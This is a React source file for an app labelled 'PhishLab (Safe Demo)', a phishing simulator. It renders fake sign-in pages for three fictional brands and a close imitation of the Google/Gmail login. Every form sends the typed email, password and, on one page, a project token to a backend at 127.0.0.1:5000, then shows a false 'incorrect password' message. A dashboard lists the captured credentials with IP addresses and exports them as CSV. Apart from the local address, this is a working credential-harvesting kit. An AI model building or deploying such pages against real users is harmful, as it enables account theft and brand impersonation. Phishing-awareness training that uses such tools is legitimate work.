import React, { useState, useEffect } from 'react';

function Navbar({ onNavigate }) {
  return (
    <nav className="flex items-center justify-between px-6 py-4 bg-gray-800 text-white">
      <div className="text-xl font-semibold">PhishLab (Safe Demo)</div>
      <div className="space-x-6">
        <button onClick={() => onNavigate('ZenithAuth')} className="hover:text-blue-400">ZenithAuth</button>
        <button onClick={() => onNavigate('QuantumFlow')} className="hover:text-blue-400">QuantumFlow</button>
        <button onClick={() => onNavigate('StellarConnect')} className="hover:text-blue-400">StellarConnect</button>
        <button onClick={() => onNavigate('Gmail')} className="hover:text-blue-400">Gmail</button>
        <button onClick={() => onNavigate('Dashboard')} className="hover:text-blue-400">Dashboard</button>
      </div>
    </nav>
  );
}

function ZenithAuth({ onNavigate }) {
  const [message, setMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    const corporate_email = e.target.corporate_email.value;
    const password = e.target.password.value;
    const site_name = "ZenithAuth";
    
    // Validate the email field before submitting to the backend
    if (!corporate_email) {
      setMessage('Please enter a corporate email.');
      return;
    }

    try {
      await fetch('http://127.0.0.1:5000/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ site_name, masked_email: corporate_email, password, corporate_email }),
      });
      setMessage('Incorrect corporate email or password. Please try again.');
    } catch (error) {
      console.error('Error submitting data:', error);
      setMessage('An error occurred. Check the console for details.');
    }
    e.target.reset();
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-900 text-white p-4">
      <div className="w-full max-w-sm p-8 bg-white rounded-lg shadow-xl text-black">
        <div className="text-center mb-6">
          <div className="text-4xl font-bold text-blue-600 mb-2">ZenithAuth</div>
          <p className="text-sm text-gray-500">Secure Access to Your Organization</p>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <label htmlFor="corporate_email" className="block text-sm font-medium text-gray-700">Corporate Email</label>
            <input name="corporate_email" id="corporate_email" type="email" required className="mt-1 block w-full px-4 py-2 bg-gray-100 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500"/>
          </div>
          <div className="mb-6">
            <label htmlFor="password" className="block text-sm font-medium text-gray-700">Password</label>
            <input name="password" id="password" type="password" required className="mt-1 block w-full px-4 py-2 bg-gray-100 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500"/>
          </div>
          <button type="submit" className="w-full py-2 px-4 bg-blue-600 text-white font-semibold rounded-md shadow-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors duration-200">
            Sign In
          </button>
        </form>
        <div className="flex justify-between mt-4 text-sm text-blue-600">
          <a href="#" className="hover:underline">Forgot password?</a>
          <a href="#" className="hover:underline">Help?</a>
        </div>
        {message && <div className="mt-4 p-3 bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 rounded-md">{message}</div>}
      </div>
    </div>
  );
}

function QuantumFlow({ onNavigate }) {
  const [message, setMessage] = useState('');
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    const username = e.target.username.value;
    const password = e.target.password.value;
    const project_token = e.target.project_token.value;
    const site_name = "QuantumFlow";
    
    // Validate the username field before submitting
    if (!username) {
      setMessage('Please enter a username.');
      return;
    }

    try {
      await fetch('http://127.0.0.1:5000/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ site_name, masked_email: username, password, project_token }),
      });
      setMessage('Login failed. Invalid credentials or expired project token.');
    } catch (error) {
      console.error('Error submitting data:', error);
      setMessage('An error occurred. Check the console for details.');
    }
    e.target.reset();
  };
  
  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-950 text-white p-4">
      <div className="w-full max-w-sm p-8 bg-gray-900 rounded-lg shadow-xl border border-gray-700">
        <div className="text-center mb-6">
          <div className="text-4xl font-mono font-bold text-purple-400">QuantumFlow</div>
          <p className="text-sm text-gray-400">The Developer's Nexus</p>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <label htmlFor="username" className="block text-sm font-mono text-gray-300">Username</label>
            <input name="username" id="username" type="text" required className="mt-1 block w-full px-4 py-2 bg-gray-800 border-2 border-gray-700 text-white rounded-md focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500 transition-colors duration-200"/>
          </div>
          <div className="mb-4">
            <label htmlFor="password" className="block text-sm font-mono text-gray-300">Password</label>
            <input name="password" id="password" type="password" required className="mt-1 block w-full px-4 py-2 bg-gray-800 border-2 border-gray-700 text-white rounded-md focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500 transition-colors duration-200"/>
          </div>
          <div className="mb-6">
            <label htmlFor="project_token" className="block text-sm font-mono text-gray-300">Optional: Project Token</label>
            <input name="project_token" id="project_token" type="text" className="mt-1 block w-full px-4 py-2 bg-gray-800 border-2 border-gray-700 text-white rounded-md focus:outline-none focus:border-purple-500 focus:ring-2 focus:ring-purple-500 transition-colors duration-200"/>
          </div>
          <button type="submit" className="w-full py-2 px-4 bg-purple-600 text-white font-semibold font-mono rounded-md shadow-lg hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 focus:ring-offset-gray-900 transition-colors duration-200">
            Sign In
          </button>
        </form>
        <div className="flex justify-between mt-4 text-xs text-gray-500 font-mono">
          <a href="#" className="hover:text-purple-400">Forgot password?</a>
          <a href="#" className="hover:text-purple-400">Need help?</a>
        </div>
        {message && <div className="mt-4 p-3 bg-red-800 border-l-4 border-red-500 text-red-300 rounded-md font-mono">{message}</div>}
      </div>
    </div>
  );
}

function StellarConnect({ onNavigate }) {
  const [message, setMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    const email_or_phone = e.target.email_or_phone.value;
    const password = e.target.password.value;
    const site_name = "StellarConnect";
    
    // Validate the email or phone field before submitting
    if (!email_or_phone) {
      setMessage('Please enter an email or phone number.');
      return;
    }

    try {
      await fetch('http://127.0.0.1:5000/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ site_name, masked_email: email_or_phone, password }),
      });
      setMessage('The password you entered is incorrect. Please try again.');
    } catch (error) {
      console.error('Error submitting data:', error);
      setMessage('An error occurred. Check the console for details.');
    }
    e.target.reset();
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100 p-4">
      <div className="w-full max-w-sm p-8 bg-white rounded-lg shadow-xl text-black border border-gray-200">
        <div className="text-center mb-6">
          <div className="text-4xl font-bold text-sky-700 mb-2">StellarConnect</div>
          <p className="text-sm text-gray-500">Your professional network, instantly.</p>
        </div>
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <label htmlFor="email_or_phone" className="block text-sm font-medium text-gray-700">Email or Phone</label>
            <input name="email_or_phone" id="email_or_phone" type="text" required className="mt-1 block w-full px-4 py-2 bg-gray-100 border border-gray-300 rounded-md focus:ring-sky-500 focus:border-sky-500"/>
          </div>
          <div className="mb-6">
            <label htmlFor="password" className="block text-sm font-medium text-gray-700">Password</label>
            <input name="password" id="password" type="password" required className="mt-1 block w-full px-4 py-2 bg-gray-100 border border-gray-300 rounded-md focus:ring-sky-500 focus:border-sky-500"/>
          </div>
          <button type="submit" className="w-full py-2 px-4 bg-sky-600 text-white font-semibold rounded-md shadow-md hover:bg-sky-700 focus:outline-none focus:ring-2 focus:ring-sky-500 focus:ring-offset-2 transition-colors duration-200">
            Sign In
          </button>
        </form>
        <div className="flex justify-between mt-4 text-xs text-gray-500">
          <a href="#" className="hover:underline">Forgot password?</a>
          <a href="#" className="hover:underline">Join Now</a>
        </div>
        {message && <div className="mt-4 p-3 bg-red-100 border-l-4 border-red-500 text-red-700 rounded-md">{message}</div>}
      </div>
    </div>
  );
}

function GmailLogin({ onNavigate }) {
  const [message, setMessage] = useState('');
  const [step, setStep] = useState('email'); // 'email' or 'password'
  const [emailValue, setEmailValue] = useState('');

  const handleEmailSubmit = async (e) => {
    e.preventDefault();
    const email = e.target.email.value;
    
    // Validate the email field before proceeding
    if (!email) {
      setMessage('Enter an email or phone number.');
      return;
    }

    setEmailValue(email);
    setStep('password');
    setMessage('');
  };

  const handlePasswordSubmit = async (e) => {
    e.preventDefault();
    const password = e.target.password.value;
    const site_name = "Gmail";
    
    // Validate the password field before submitting
    if (!password) {
      setMessage('Enter a password.');
      return;
    }

    try {
      await fetch('http://127.0.0.1:5000/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          site_name, 
          masked_email: emailValue, 
          password,
          email: emailValue 
        }),
      });
      setMessage('Wrong password. Try again or click Forgot password to reset it.');
    } catch (error) {
      console.error('Error submitting data:', error);
      setMessage('An error occurred. Check the console for details.');
    }
    e.target.reset();
  };

  const handleBackToEmail = () => {
    setStep('email');
    setEmailValue('');
    setMessage('');
  };

 return (
  <div className="flex items-center justify-center min-h-screen bg-white p-4">
    <div className="w-full max-w-md">
      {/* Google Logo */}
      <div className="text-center mb-8">
        <div className="inline-flex items-center justify-center mb-6">
          <span className="text-blue-500 text-4xl font-normal tracking-tight">G</span>
          <span className="text-red-500 text-4xl font-normal tracking-tight">o</span>
          <span className="text-yellow-500 text-4xl font-normal tracking-tight">o</span>
          <span className="text-blue-500 text-4xl font-normal tracking-tight">g</span>
          <span className="text-green-500 text-4xl font-normal tracking-tight">l</span>
          <span className="text-red-500 text-4xl font-normal tracking-tight">e</span>
        </div>
        <h1 className="text-2xl font-normal text-gray-800 mb-2">
          {step === 'email' ? 'Sign in' : 'Welcome'}
        </h1>
        {step === 'email' ? (
          <p className="text-base text-gray-600">Use your Google Account</p>
        ) : (
          <div className="flex items-center justify-center bg-gray-50 rounded-full px-4 py-2 mb-4">
            <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-white text-sm font-medium mr-3">
              {emailValue.charAt(0).toUpperCase()}
            </div>
            <span className="text-sm text-gray-700">{emailValue}</span>
          </div>
        )}
      </div>

      {/* Email Step */}
      {step === 'email' && (
        <form onSubmit={handleEmailSubmit} className="space-y-6">
          <div>
            <input
              name="email"
              id="email"
              type="text"
              placeholder="Email or phone"
              required
              className="w-full px-4 py-3 text-base border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent text-gray-900"
            />
            <a href="#" className="inline-block mt-3 text-sm text-blue-600 hover:underline">
              Forgot email?
            </a>
          </div>

          <div className="text-sm text-gray-600">
            Not your computer? Use Guest mode to sign in privately.{' '}
            <a href="#" className="text-blue-600 hover:underline">Learn more</a>
          </div>

          <div className="flex items-center justify-between">
            <a href="#" className="text-sm font-medium text-blue-600 hover:underline">
              Create account
            </a>
            <button
              type="submit"
              className="bg-[#bcd4ff]  text-blue-300 font-medium py-2 px-6 rounded-full shadow-sm hover:bg-[#a7c7ff] transition-colors duration-200"
            >
              Next
            </button>
          </div>
        </form>
      )}

      {/* Password Step */}
      {step === 'password' && (
        <form onSubmit={handlePasswordSubmit} className="space-y-6">
          <div>
            <input
              name="password"
              id="password"
              type="password"
              placeholder="Enter your password"
              required
              className="w-full px-4 py-3 text-base border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-transparent text-gray-900"
            />
            <a href="#" className="inline-block mt-3 text-sm text-blue-600 hover:underline">
              Forgot password?
            </a>
          </div>

          <div className="flex items-center justify-between">
            {/* The "Back" button is styled as a link, so we will not apply a background to it */}
            <button
              type="button"
              onClick={handleBackToEmail}
              className="bg-[#bcd4ff] text-blue-300 font-medium py-2 px-6 rounded-full shadow-sm hover:bg-[#a7c7ff] transition-colors duration-200"
            >
              Back
            </button>
            <button
              type="submit"
              className="bg-blue-200 text-blue-300 font-medium py-2 px-6 rounded-full shadow-sm hover:bg-blue-300 transition-colors duration-200"
            >
              Next
            </button>
          </div>
        </form>
      )}

      {/* Error Message */}
      {message && (
        <div className="mt-4 p-3 border border-red-300 bg-red-50 text-red-700 text-sm rounded-md">
          {message}
        </div>
      )}

      {/* Footer */}
      <div className="mt-12 flex items-center justify-between text-xs text-gray-500">
        <select className="bg-transparent border-none text-xs text-gray-500 cursor-pointer">
          <option>English (United States)</option>
        </select>
        <div className="space-x-6">
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Terms</a>
        </div>
      </div>
    </div>
  </div>
);
}

function Dashboard({ onNavigate }) {
  const [logs, setLogs] = useState([]);
  const [filter, setFilter] = useState('all');
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchLogs = async () => {
      try {
        const response = await fetch('http://127.0.0.1:5000/logs');
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        setLogs(data);
      } catch (e) {
        setError("Failed to load logs. Please check the server connection.");
        console.error("Could not fetch logs:", e);
      } finally {
        setLoading(false);
      }
    };
    fetchLogs();
  }, []);

  const filteredLogs = filter === 'all'
    ? logs
    : logs.filter(log => log.site_name === filter);

  let content;
  if (loading) {
    content = <p className="text-center text-gray-500">Loading logs...</p>;
  } else if (error) {
    content = <p className="text-center text-red-500">{error}</p>;
  } else if (filteredLogs.length === 0) {
    content = <p className="text-center text-gray-500">No logs found.</p>;
  } else {
    content = (
      <div className="overflow-x-auto">
        <table className="min-w-full text-left table-auto bg-white text-black rounded-lg shadow-md">
          <thead className="bg-gray-200">
            <tr>
              <th className="px-4 py-2 font-medium text-gray-700">Site</th>
              <th className="px-4 py-2 font-medium text-gray-700">Email (Masked)</th>
              <th className="px-4 py-2 font-medium text-gray-700">Captured Data</th>
              <th className="px-4 py-2 font-medium text-gray-700">IP</th>
              <th className="px-4 py-2 font-medium text-gray-700">Timestamp</th>
            </tr>
          </thead>
          <tbody>
            {filteredLogs.map((row, index) => (
              <tr key={index} className="border-t border-gray-200 hover:bg-gray-50">
                <td className="px-4 py-2">{row.site_name}</td>
                <td className="px-4 py-2">{row.masked_email}</td>
                <td className="px-4 py-2">
                  <pre className="whitespace-pre-wrap text-sm">{JSON.stringify(row.captured_data, null, 2)}</pre>
                </td>
                <td className="px-4 py-2">{row.ip_address}</td>
                <td className="px-4 py-2">{row.timestamp}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    );
  }

  return (
    <div className="bg-gray-100 min-h-screen p-6 text-gray-900">
      <div className="max-w-6xl mx-auto">
        <div className="flex items-center justify-between mb-4">
          <select
            value={filter}
            onChange={e => setFilter(e.target.value)}
            className="bg-white border border-gray-300 text-gray-700 px-3 py-2 rounded-lg shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
          >
            <option value="all">All Sites</option>
            <option value="ZenithAuth">ZenithAuth</option>
            <option value="QuantumFlow">QuantumFlow</option>
            <option value="StellarConnect">StellarConnect</option>
            <option value="Gmail">Gmail</option>
          </select>
          <a
            href="http://127.0.0.1:5000/export"
            className="bg-green-600 hover:bg-green-700  font-medium px-4 py-2 rounded-lg shadow-sm transition-colors duration-200 text-shadow-white"
          >
            Export CSV
          </a>
        </div>
        {content}
      </div>
    </div>
  );
}

export default function App() {
  const [currentPage, setCurrentPage] = useState('ZenithAuth');

  const renderPage = () => {
    switch (currentPage) {
      case 'ZenithAuth':
        return <ZenithAuth onNavigate={setCurrentPage} />;
      case 'QuantumFlow':
        return <QuantumFlow onNavigate={setCurrentPage} />;
      case 'StellarConnect':
        return <StellarConnect onNavigate={setCurrentPage} />;
      case 'Gmail':
        return <GmailLogin onNavigate={setCurrentPage} />;
      case 'Dashboard':
        return <Dashboard onNavigate={setCurrentPage} />;
      default:
        return <ZenithAuth onNavigate={setCurrentPage} />;
    }
  };

  return (
    <div className="min-h-screen bg-gray-900">
      <div className="container mx-auto px-4">
        <div className="flex flex-col items-center justify-center">
          <div className="w-full text-center mb-10 mt-6">
            <h1 className="text-5xl font-extrabold tracking-tight mb-2 text-white">PhishLab Simulator</h1>
            <p className="text-lg text-gray-400">Navigate between different fictional login pages to test the phishing simulator.</p>
          </div>
          <div className="w-full flex justify-center space-x-4 mb-10">
            <button onClick={() => setCurrentPage('ZenithAuth')} className="px-6 py-2 rounded-full border-2 font-medium transition-colors duration-200 hover:bg-white hover:text-blue-300 focus:outline-none focus:ring-2 focus:ring-white focus:ring-offset-2 focus:ring-offset-gray-900 border-transparent bg-gray-800 text-white">
              ZenithAuth
            </button>
            <button onClick={() => setCurrentPage('QuantumFlow')} className="px-6 py-2 rounded-full border-2 font-medium transition-colors duration-200 hover:bg-white hover:text-blue-300 focus:outline-none focus:ring-2 focus:ring-white focus:ring-offset-2 focus:ring-offset-gray-900 border-transparent bg-gray-800 text-white">
              QuantumFlow
            </button>
            <button onClick={() => setCurrentPage('StellarConnect')} className="px-6 py-2 rounded-full border-2 font-medium transition-colors duration-200 hover:bg-white hover:text-blue-300 focus:outline-none focus:ring-2 focus:ring-white focus:ring-offset-2 focus:ring-offset-gray-900 border-transparent bg-gray-800 text-white">
              StellarConnect
            </button>
            <button onClick={() => setCurrentPage('Gmail')} className="px-6 py-2 rounded-full border-2 font-medium transition-colors duration-200 hover:bg-white hover:text-blue-300 focus:outline-none focus:ring-2 focus:ring-white focus:ring-offset-2 focus:ring-offset-gray-900 border-transparent bg-gray-800 text-white">
              Gmail
            </button>
            <button onClick={() => setCurrentPage('Dashboard')} className="px-6 py-2 rounded-full border-2 font-medium transition-colors duration-200 hover:bg-white hover:text-blue-300 focus:outline-none focus:ring-2 focus:ring-white focus:ring-offset-2 focus:ring-offset-gray-900 border-transparent bg-gray-800 text-white">
              Dashboard
            </button>
          </div>
          <div className="w-full flex justify-center">
            {renderPage()}
          </div>
        </div>
      </div>
    </div>
  );
}